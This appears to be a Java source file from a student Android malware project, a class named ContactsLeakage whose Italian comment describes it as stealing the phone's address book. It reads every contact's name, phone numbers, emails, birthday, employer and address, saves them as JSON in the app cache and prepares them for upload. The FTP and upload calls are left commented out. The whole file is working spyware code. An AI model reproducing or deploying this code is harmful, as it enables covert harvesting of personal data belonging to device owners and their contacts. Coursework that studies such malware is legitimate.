package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

/**
 * Permette il furto dei contatti della Rubrica
 */
public class ContactsLeakage {

    private static final String TAG = "CONTACTS";
    private JSONArray contacts;

    public File[] leak(Context context) {

        Log.d(TAG, "Started");

        String name = "";
        String nickName = "";
        String homePhone = "";
        String mobilePhone = "";
        String workPhone = "";
        String homeEmail = "";
        String workEmail = "";
        String birthday = "";
        String companyName = "";
        String title = "";
        String street = "";
        String postcode = "";
        String city = "";
        String country = "";

        contacts = new JSONArray();

        ContentResolver contentResolver = context.getContentResolver();
        Uri uri = ContactsContract.Contacts.CONTENT_URI; // Contact URI

        // Cursor that returns all contacts in ascending order
        Cursor contactsCursor = contentResolver.query(uri, null, null,
                null, ContactsContract.Contacts.DISPLAY_NAME + " ASC ");

        // each contact
        if (contactsCursor.moveToFirst()) {
            do {
                long contactID = contactsCursor.getLong(contactsCursor.getColumnIndex(ContactsContract.Contacts._ID)); // contact ID
                Uri dataUri = ContactsContract.Data.CONTENT_URI; // data URI

                // Cursor that returns all data for single contact
                Cursor dataCursor = contentResolver.query(dataUri, null, ContactsContract.Data.CONTACT_ID + " = " + contactID, null, null);

                if (dataCursor.moveToFirst()) {
                    name = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    do {
                        // Getting NickName
                        if (dataCursor.getString(dataCursor.getColumnIndex("mimetype")).equals(ContactsContract.CommonDataKinds.Nickname.CONTENT_ITEM_TYPE))
                            nickName = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Nickname.NAME));

                        // Getting Phone numbers
                        if (dataCursor.getString(dataCursor.getColumnIndex("mimetype")).equals(ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)) {
                            switch (dataCursor.getInt(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE))) {
                                case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                                    homePhone = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                                    mobilePhone = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                                    workPhone = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                                    break;
                            }
                        }

                        // Getting EMails
                        if (dataCursor.getString(dataCursor.getColumnIndex("mimetype")).equals(ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE)) {
                            switch (dataCursor.getInt(dataCursor.getColumnIndex("data2"))) {
                                case ContactsContract.CommonDataKinds.Email.TYPE_HOME:
                                    homeEmail = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS));
                                    break;
                                case ContactsContract.CommonDataKinds.Email.TYPE_WORK:
                                    workEmail = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS));
                                    break;
                            }
                        }

                        // Getting birthday
                        if (dataCursor.getString(dataCursor.getColumnIndex("mimetype")).equals(ContactsContract.CommonDataKinds.Event.CONTENT_ITEM_TYPE)) {
                            switch (dataCursor.getInt(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Event.TYPE))) {
                                case ContactsContract.CommonDataKinds.Event.TYPE_BIRTHDAY:
                                    birthday = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Event.START_DATE));
                                    break;
                            }
                        }

                        // Getting Organization details
                        if (dataCursor.getString(dataCursor.getColumnIndex("mimetype")).equals(ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE)) {
                            companyName = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY));
                            title = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE));
                        }

                        if (dataCursor.getString(dataCursor.getColumnIndex("mimetype")).equals(ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE)) {
                            street = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                            city = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                            country = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                            postcode = dataCursor.getString(dataCursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                        }

                    } while (dataCursor.moveToNext());

                    dataCursor.close();

                    // create contact Json
                    JSONObject contact = new JSONObject();
                    try {
                        contact.put("Name", name);
                        contact.put("Nickname", nickName);
                        contact.put("Birthday", birthday);

                        JSONObject phone = new JSONObject();
                        phone.put("HomePhone", homePhone);
                        phone.put("MobilePhone", mobilePhone);
                        phone.put("WorkPhone", workPhone);
                        contact.put("Phone", phone);

                        JSONObject email = new JSONObject();
                        email.put("HomeEmail", homeEmail);
                        email.put("WorkEmail", workEmail);
                        contact.put("Email", email);

                        contact.put("Company", companyName);
                        contact.put("Title", title);

                        JSONObject address = new JSONObject();
                        address.put("Street", street);
                        address.put("Postcode", postcode);
                        address.put("City", city);
                        address.put("Country", country);
                        contact.put("Address", address);

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    contacts.put(contact);
                    //Log.d(TAG, contact.toString());
                }
            } while (contactsCursor.moveToNext());
        }

        contactsCursor.close();


        // save JsonArr to File
        Writer output = null;
        String pathname = "contacts_" + new SimpleDateFormat("yyyy.MM.dd-HH.mm.ss").format(new Date()) + ".json";
        File file = new File(context.getCacheDir(), pathname);
        try {
            output = new BufferedWriter(new FileWriter(file));
            output.write(contacts.toString());
            output.close();
            File[] files = new File[1];
            files[0] = file;
            //new FTP(context).upload(files, "contacts");
            /*
            if(UploadData.getIstance(context).addFile("contacts", files))
                Log.d(TAG, "Contacts data added!");
                */
            return files;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
        //Log.d(TAG, "Ended");
    }

}

/*
 // local contacts
        Cursor contacts = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

        if(contacts != null)
            while (contacts.moveToNext()) {
                //Log.d("RUBRICA_NAME", contacts.getString(contacts.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
                //String lookupKey = contacts.getString(contacts.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
                //Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI,lookupKey);
                //Log.i(TAG, uri.toString());
                //contentResolver.delete(uri, null, null);
                int column = contacts.getColumnCount();
                Log.d(TAG, "column: " + Integer.toString(column));

            }
        Log.d(TAG, "there're not contacts");

 */